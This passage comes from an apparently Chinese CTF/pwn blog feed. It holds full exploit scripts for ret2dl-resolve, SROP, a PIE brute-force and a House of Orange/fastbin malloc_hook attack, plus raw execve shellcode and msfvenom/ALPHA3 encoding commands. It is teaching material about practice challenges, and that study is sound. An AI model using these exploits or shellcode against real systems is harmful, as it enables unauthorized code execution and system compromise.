<span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>得到一个shell</p>
<h2 id="0x03-工具攻击"><a href="#0x03-工具攻击" class="headerlink" title="0x03 工具攻击"></a>0x03 工具攻击</h2><p>根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用 roputil 来进行攻击。代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>再放一段不用工具的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">P = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0x08048448</span></span><br><span class="line">bss = <span class="number">0x0804aa00</span></span><br><span class="line">pppr_addr = <span class="number">0x080485d9</span></span><br><span class="line">pop_ebp = <span class="number">0x080485db</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x28</span>+<span class="number">4</span>) * <span class="string">'a'</span></span><br><span class="line">payload+= p32(P.plt[<span class="string">'read'</span>])</span><br><span class="line">payload+= p32(pppr_addr)</span><br><span class="line">payload+= p32(<span class="number">0</span>)</span><br><span class="line">payload+= p32(bss) </span><br><span class="line">payload+= p32(<span class="number">0x400</span>)</span><br><span class="line">payload+= p32(pop_ebp)</span><br><span class="line">payload+= p32(bss)</span><br><span class="line">payload+= p32(lr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">r_info = <span class="number">0x107</span></span><br><span class="line">rel_plt = <span class="number">0x0804833c</span>  </span><br><span class="line">dynsym =  <span class="number">0x080481dc</span></span><br><span class="line">dynstr = <span class="number">0x0804827c</span></span><br><span class="line"></span><br><span class="line">fake_sys_addr = bss + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sys_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line">fake_sys_addr = fake_sys_addr + align</span><br><span class="line">index = (fake_sys_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">r_info = (index &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">st_name = (fake_sys_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sys = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>) </span><br><span class="line"></span><br><span class="line">fake_rel = p32(P.got[<span class="string">'read'</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = bss + <span class="number">28</span></span><br><span class="line">fake_index = fake_rel_addr - rel_plt    </span><br><span class="line"></span><br><span class="line">payload = p32(bss)</span><br><span class="line">payload+= p32(plt_0)</span><br><span class="line">payload+= p32(fake_index)</span><br><span class="line">payload+= p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+= p32(bss+<span class="number">0x80</span>)</span><br><span class="line">payload+= p32(<span class="number">0</span>)</span><br><span class="line">payload+= p32(<span class="number">0</span>)</span><br><span class="line">payload+= fake_rel</span><br><span class="line">payload+= <span class="string">'a'</span>*align</span><br><span class="line">payload+= fake_sys</span><br><span class="line">payload+= <span class="string">'system'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'x00'</span>)</span><br><span class="line">payload+= <span class="string">'/bin/shx00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="其它利用方式"><a href="#其它利用方式" class="headerlink" title="其它利用方式"></a>其它利用方式</h3><p>在.dynamic节中伪造.dynstr节地址<br> fake link_map</p>
<h2 id="0x04参考资料"><a href="#0x04参考资料" class="headerlink" title="0x04参考资料"></a>0x04参考资料</h2><p>i春秋：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44816&amp;highlight=linux%2Bpwn%2B%E5%85%A5%E9%97%A8" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44816&amp;highlight=linux%2Bpwn%2B%E5%85%A5%E9%97%A8</a><br>ctfwiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_5" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_5</a><br>一位师傅的博客：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br>看雪:<a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>SROP利用分析</title>
    <url>/year/10/23/cl7iordp00017293fwr6if5nz/</url>
    <content><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>传统的ROP技术，尤其是amd64上的ROP，需要寻找大量的gadgets以对寄存器进行赋值，执行特定操作，如果没有合适的gadgets就需要进行各种奇怪的组装。这一过程阻碍了ROP技术的使用。而SROP技术的提出大大简化了ROP攻击的流程。</p>
<a id="more"></a>
<h2 id="SROP-应用场景与原理"><a href="#SROP-应用场景与原理" class="headerlink" title="SROP 应用场景与原理"></a>SROP 应用场景与原理</h2><p><img src="/23/cl7iordp00017293fwr6if5nz/1.jpg" alt="SORP"><br>上方为用户层，下方为内核层。对于Linux来说</p>
<ol>
<li>当一个用户层进程发起signal时，控制权切到内核层</li>
<li><strong>内核保存进程的上下文(对我们来说重要的就是寄存器状态)到用户的栈上</strong>，然后再把rt_sigreturn地址压栈，跳到用户层执行Signal Handler，即调用rt_sigreturn</li>
<li>rt_sigreturn执行完，跳到内核层</li>
<li><strong>内核恢复②中保存的进程上下文</strong>，控制权交给用户层进程</li>
</ol>
<p>有趣的是，这个过程存在着两个问题:</p>
<ol>
<li>rt_sigreturn在用户层调用，地址保存在栈上，执行后出栈</li>
<li>上下文也保存在栈上，比rt_sigreturn先进栈，且内核恢复上下文时不校验<br>因此，<strong>我们完全可以自己在栈上放好上下文，然后自己调用re_sigreturn，跳过步骤1、2。</strong> 此时，<strong>我们将通过步骤3、4让内核把我们伪造的上下文恢复到用户进程中</strong>，也就是说我们可以重置所有寄存器的值，一次到位地做到控制通用寄存器，rip和完成栈劫持。这里的上下文我们称之为Sigreturn Frame。文章中同样给出了Sigreturn Frame的结构。<br><img src="/23/cl7iordp00017293fwr6if5nz/a.png" alt><h2 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3>我们在构造 ROP 攻击的时候，需要满足下面的条件</li>
</ol>
<ul>
<li><strong>可以控制栈溢出的内容</strong></li>
<li><strong>需要知道相应的地址</strong><ul>
<li><strong>/bin/sh字符串的地址</strong></li>
<li><strong>syscall的地址</strong></li>
<li><strong>SginalFrame的地址</strong></li>
</ul>
</li>
<li>需要有够大的空间来塞下整个 sigal frame</li>
</ul>
<h3 id="0x02-利用技巧"><a href="#0x02-利用技巧" class="headerlink" title="0x02 利用技巧"></a>0x02 利用技巧</h3><ul>
<li>可以通过<code>read</code>等函数的返回值设置<code>rax</code>来调用<code>syscall</code>从而完成<code>sigreturn</code>的系统调用</li>
<li>通过劫持<code>ebp</code>来使栈上的数据地址可确定</li>
<li><code>pwntools</code>的<code>SignaFram</code>工具</li>
</ul>
<p>对于原生的i386来说，其SignalFrame的设置为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.arch = ‘i386’</span><br><span class="line">SROPFrame = SigreturnFrame(kernel = ‘i386’)</span><br></pre></td></tr></table></figure>

<p>对于amd64上运行的32位程序来说，其SignalFrame的设置为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.arch=’i386’</span><br><span class="line">SROPFrame = SigreturnFrame(kernel = ‘amd64’)</span><br></pre></td></tr></table></figure>

<h2 id="0x03-示例"><a href="#0x03-示例" class="headerlink" title="0x03 示例"></a>0x03 示例</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/23/cl7iordp00017293fwr6if5nz/2.png" alt="题目"><br>程序很简单，只是一个栈溢出，只开了<code>NX</code>保护。但是看到程序没有后门函数甚至没有泄露函数，无法通过泄露<code>libc</code>来获得<code>shell</code>。并且找的<code>gadget</code>屈指可数。。。。<br><img src="/23/cl7iordp00017293fwr6if5nz/3.png" alt="gadget"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ropper -f unexploitable</span><br></pre></td></tr></table></figure>

<p>使用这个工具成功找到了一个<code>syscall</code>的<code>gadget</code>所以用SROP就比较合适了</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./unexploitable'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">SROPFrame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400560</span></span><br><span class="line">set_read_addr = <span class="number">0x40055B</span></span><br><span class="line">read_addr = <span class="number">0x400571</span></span><br><span class="line">fake_stack_addr = <span class="number">0x60116c</span></span><br><span class="line">fake_ebp_addr = <span class="number">0x60116c</span></span><br><span class="line">binsh_addr = <span class="number">0x60115c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(fake_stack_addr)</span><br><span class="line">payload += p64(set_read_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">SROPFrame.rax = constants.SYS_execve</span><br><span class="line">SROPFrame.rdi = binsh_addr</span><br><span class="line">SROPFrame.rsi = <span class="number">0</span></span><br><span class="line">SROPFrame.rdx = <span class="number">0</span></span><br><span class="line">SROPFrame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(fake_stack_addr + <span class="number">0x10</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(fake_ebp_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(SROPFrame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>+(<span class="string">'a'</span>)*<span class="number">7</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>安恒杯2019-so_easy_pwn</title>
    <url>/year/10/21/cl7iordqe004y293f285gpxxb/</url>
    <content><![CDATA[<p>通过修改栈上内容来影响下个函数栈上的状态，以此来劫持函数地址</p>
<a id="more"></a>
<h2 id="0x01-PIE绕过"><a href="#0x01-PIE绕过" class="headerlink" title="0x01 PIE绕过"></a>0x01 PIE绕过</h2><p>PIE开启最后三位也是不变的，一般我们会修改它的后四位地址，然后爆破那一位达到函数调用的效果。</p>
<p>通过recv(timeout = 1)可以触发exccept</p>
<h2 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">shell = <span class="string">'a9cd'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> i </span><br><span class="line">    sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#sh = remote('101.71.29.5',10000)</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Welcome our the "</span>)</span><br><span class="line">    PIE_addr =hex(int(sh.recv(<span class="number">5</span>)))</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">12</span> +p32(int(PIE_addr + shell,<span class="number">16</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"So, Can you tell me your name?"</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">"Please input your choice:(1.hello|2.byebye):"</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sh.sendline(<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'exception %s'</span> % e</span><br><span class="line">	sh.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>极客巅峰第一道pwn</title>
    <url>/year/10/19/cl7iordqk005g293f0e3wn4w3/</url>
    <content><![CDATA[<h2 id="0x0-解题思路"><a href="#0x0-解题思路" class="headerlink" title="0x0 解题思路"></a>0x0 解题思路</h2><p>首先发现uaf漏洞但是只能<code>show</code>和<code>free</code>一次，而且<code>free</code>掉的<code>chunk</code>只能被<code>top_chunk</code>合并。所以考虑利用溢出到<code>top chunk</code>修改<code>top chunk</code>的size然后再次<code>malloc</code>泄露出libc，利用<code>fastbin attack</code>劫持<code>malloc_hook</code>用<code>onegadget</code>获取shell</p>
<a id="more"></a>
<h2 id="0x01-流程"><a href="#0x01-流程" class="headerlink" title="0x01 流程"></a>0x01 流程</h2><ul>
<li>溢出到<code>top_chunk</code>的size，修改其为一个较小的值</li>
<li><code>malloc</code>一个大于刚才size的值，这时这个<code>chunk</code>会被添加到<code>unsort_bin</code>中,<code>fd</code>、<code>bk</code>指针被置为libc里的地址</li>
<li>再次<code>malloc</code>一个<code>chunk</code></li>
<li>利用show泄露出libc的地址</li>
<li>uaf劫持<code>malloc_hook</code> </li>
<li>获取shell<h2 id="0x02-新学到的知识"><a href="#0x02-新学到的知识" class="headerlink" title="0x02 新学到的知识"></a>0x02 新学到的知识</h2><h3 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h3>初始状态时 unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。<h3 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h3></li>
</ul>
<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，<strong>因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</strong></p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>如我们前面所述，House of Orange 的核心在于在<strong>没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)</strong>。 这种操作的原理简单来说是<strong>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中</strong>，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>进行chunk的分配时的顺序：</p>
<ul>
<li>fastbin</li>
<li>small bins</li>
<li>unsorted bins</li>
<li>large bins</li>
<li>top chunk</li>
</ul>
<p>如果以上都不能满足申请的需求，则需要执行 sysmalloc 来向系统申请更多的空间。但是对于堆来说有 mmap 和 brk 两种分配方式，<strong>我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</strong></p>
<p>伪造的 top chunk size 的要求：</p>
<ol>
<li>伪造的size必须对齐内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ol>
<h3 id="malloc-hook劫持"><a href="#malloc-hook劫持" class="headerlink" title="malloc_hook劫持"></a>malloc_hook劫持</h3><blockquote>
<p>何谓钩子函数，当一个函数挂载了钩子函数后，你执行这个函数时，实际执行的是钩子函数</p>
</blockquote>
<p>通过泄露libc可以找到hook的地址</p>
<h3 id="Fastbin-Attack-To-stack"><a href="#Fastbin-Attack-To-stack" class="headerlink" title="Fastbin Attack To stack"></a>Fastbin Attack To stack</h3><p>必须满足fake chunk的size在fastbin的范围</p>
<h2 id="0x03-脚本"><a href="#0x03-脚本" class="headerlink" title="0x03 脚本"></a>0x03 脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./pwn')</span></span><br><span class="line">sh = remote(<span class="string">'55fca716.gamectf.com'</span>,<span class="number">37009</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    sh.send(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Size &gt; '</span>,size)</span><br><span class="line">    sh.sendafter(<span class="string">'Content &gt;'</span>,content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">()</span>:</span></span><br><span class="line">    sh.send(<span class="string">'2'</span>)</span><br><span class="line">    data = u64(sh.recvuntil(<span class="string">'Done!\n'</span>)[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">    <span class="keyword">print</span> hex(data)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">()</span>:</span></span><br><span class="line">    sh.send(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Size &gt; '</span>)</span><br><span class="line">    sh.send(size)</span><br><span class="line">    sh.recvuntil(<span class="string">'Content &gt; '</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">fake_chunk_size = <span class="number">0xfe1</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">24</span></span><br><span class="line">payload += p64(fake_chunk_size)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"What's your name?\n"</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'24'</span>, <span class="string">'deadbeef'</span>)</span><br><span class="line">edit_note(<span class="string">'32'</span>,payload)</span><br><span class="line">add_note(<span class="string">'4096'</span>, <span class="string">'deadbeef'</span>)</span><br><span class="line">add_note(<span class="string">'96'</span>,<span class="string">'deadbeef'</span>)</span><br><span class="line">addr = show_note()</span><br><span class="line">libcbase = addr - <span class="number">1640</span> - <span class="number">0x3c4b20</span></span><br><span class="line">one_gadget = libcbase + <span class="number">0xf02a4</span></span><br><span class="line">malloc_hook_offset = <span class="number">0x3C4B10</span></span><br><span class="line">malloc_hook_addr = libcbase + malloc_hook_offset<span class="number">-11</span><span class="number">-24</span></span><br><span class="line">log.info(<span class="string">'malloc_addr: '</span> + hex(malloc_hook_addr))</span><br><span class="line">log.info(<span class="string">'one_gadget_addr: '</span>+ hex(one_gadget))</span><br><span class="line">delete_note()</span><br><span class="line">edit_note(<span class="string">'8'</span>,p64(malloc_hook_addr))</span><br><span class="line">add_note(<span class="string">'96'</span>,<span class="string">'deadbeef'</span>)</span><br><span class="line">add_note(<span class="string">'96'</span>,<span class="string">'a'</span>*<span class="number">19</span>+p64(one_gadget))</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sh.send(<span class="string">'24'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x04-一些有待解决的迷惑问题"><a href="#0x04-一些有待解决的迷惑问题" class="headerlink" title="0x04 一些有待解决的迷惑问题"></a>0x04 一些有待解决的迷惑问题</h2><p>recvuntil 和 sendline总是容易出问题</p>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>shellcode编码</title>
    <url>/year/10/18/cl7iordq20041293fb6xkv32y/</url>
    <content><![CDATA[<h2 id="字符检测绕过"><a href="#字符检测绕过" class="headerlink" title="字符检测绕过"></a>字符检测绕过</h2><p>有时候程序会对输入进行一些可打印检查,导致平常的shellcode失效,这个时候需要对shellcode进行编码.<br>可打印检查一般分为Alphanumeric(字符在[A-Za-z0-9]区间)和Printable(字符的ascii码在0x1f和0x7f区间,不包含边界).</p>
<p>例题:pwnable.tw:Death Note.</p>
<a id="more"></a>
<h3 id="x86编码"><a href="#x86编码" class="headerlink" title="x86编码"></a>x86编码</h3><p>x86下一个27字节的可用<code>shellcode</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;\x42\x4d\x36\x91\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80&quot;</span><br></pre></td></tr></table></figure>

<p>x86下可以使用msf内置的encoder.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax</span><br><span class="line">#可以直接生成shellcode,BufferRegister是指向shellcode的寄存器.</span><br><span class="line">#如果不声明BufferRegister,生成的shellcode会有额外的几条并不是可打印字符的指令来确定shellcode的位置.</span><br><span class="line">#x86/alpha_mixed这个encoder也可.x86/unicode_mixed与x86/unicode_upper用于宽字节的情况.</span><br><span class="line"></span><br><span class="line">cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax</span><br><span class="line">#也可以用msf来编码已有的shellcode</span><br></pre></td></tr></table></figure>

<h3 id="x64编码"><a href="#x64编码" class="headerlink" title="x64编码"></a>x64编码</h3><p><a href="http://rootkiter.com/2015/11/07/ShellCode%E4%B9%9F%E6%98%AF%E4%B8%80%E9%97%A8%E5%AD%A6%E9%97%AE.html" target="_blank" rel="noopener">alpha3工具</a></p>
<h4 id="一段可用的x64-shellcode"><a href="#一段可用的x64-shellcode" class="headerlink" title="一段可用的x64 shellcode"></a>一段可用的x64 shellcode</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>

<h4 id="一段可用的x64-可见字符shellcode"><a href="#一段可用的x64-可见字符shellcode" class="headerlink" title="一段可用的x64 可见字符shellcode"></a>一段可用的x64 可见字符shellcode</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M1L3a144H4p4l32354X4x3w8K2D3T3y1P0a0k3Q0f2O0g2I4H0p7m0A03</span><br></pre></td></tr></table></figure>

<p>生成命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python ALPHA3.py x64 ascii mixedcase RAX --input=&quot;shellcode&quot;</span><br></pre></td></tr></table></figure>

<h3 id="手动编码"><a href="#手动编码" class="headerlink" title="手动编码"></a>手动编码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./chall3"</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">	push rax</span></span><br><span class="line"><span class="string">	pop rdi</span></span><br><span class="line"><span class="string">	push r15</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	push r15</span></span><br><span class="line"><span class="string">	push r15</span></span><br><span class="line"><span class="string">	push r15</span></span><br><span class="line"><span class="string">	push r15</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	push 0x60</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	sub byte ptr [rax + 0x2a], dl</span></span><br><span class="line"><span class="string">	sub byte ptr [rax + 0x2a], dl</span></span><br><span class="line"><span class="string">	sub byte ptr [rax + 0x2b], dl</span></span><br><span class="line"><span class="string">	sub byte ptr [rax + 0x2d], dl</span></span><br><span class="line"><span class="string">	sub byte ptr [rax + 0x2e], dl</span></span><br><span class="line"><span class="string">	push r15</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	push 0x3b</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#r15 = 0</span></span><br><span class="line"><span class="comment">#rax = &amp;shellcode</span></span><br><span class="line">payload = asm(payload)</span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line"></span><br><span class="line">payload += <span 